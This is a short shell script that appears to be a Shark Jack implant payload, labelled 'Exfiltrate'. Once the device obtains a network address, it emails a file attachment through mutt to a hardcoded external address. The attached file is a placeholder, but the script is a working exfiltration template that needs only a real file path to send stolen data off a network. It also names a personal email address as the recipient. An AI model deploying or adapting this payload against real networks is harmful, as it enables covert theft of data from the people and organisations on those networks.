#!/bin/sh
# Title: Email
# Description: Exfiltrate data with email
# Author: Jules Bozouklian - bozou_client
# Version: 1.0
# Category: Exfiltrate
#
# LED SETUP (Magenta)... Setting logs and waiting for IP address from DHCP
# LED ATTACK (Yellow)... Send email
#

LOG_DIR=/root/loot/exfiltrate/email
TIMESTAMP=`date +"%Y-%m-%d"`
TIMESTAMP_FULL=`date +"%Y-%m-%d %T"`
EMAIL_RECEIPT="jules.bozouklian@epitech.eu"
MUTT_FILE=/root/.muttrc

LED SETUP

NETMODE DHCP_CLIENT

# Make log file
mkdir -p $LOG_DIR
LOG_FILE=$TIMESTAMP"_$(find $LOG_DIR -type f | wc -l).log"
LOG="$LOG_DIR/$LOG_FILE"

# Wait until Shark Jack has an IP address
while [ -z "$IPADDR" ]; do sleep 1 && IPADDR=$(ifconfig eth0 | grep "inet addr"); done

LED ATTACK

# create a fake file to send
touch /root/test-file.txt

# Send email
# -f = mutt config file
# -a = path to a file
# -s = subject
function sendEmail() {
  echo "Shark Jack log" | mutt -F $MUTT_FILE -a /root/test-file.txt -s "Log $TIMESTAMP_FULL " -- $EMAIL_RECEIPT
  sleep 5s
}

sendEmail

LED FINISH
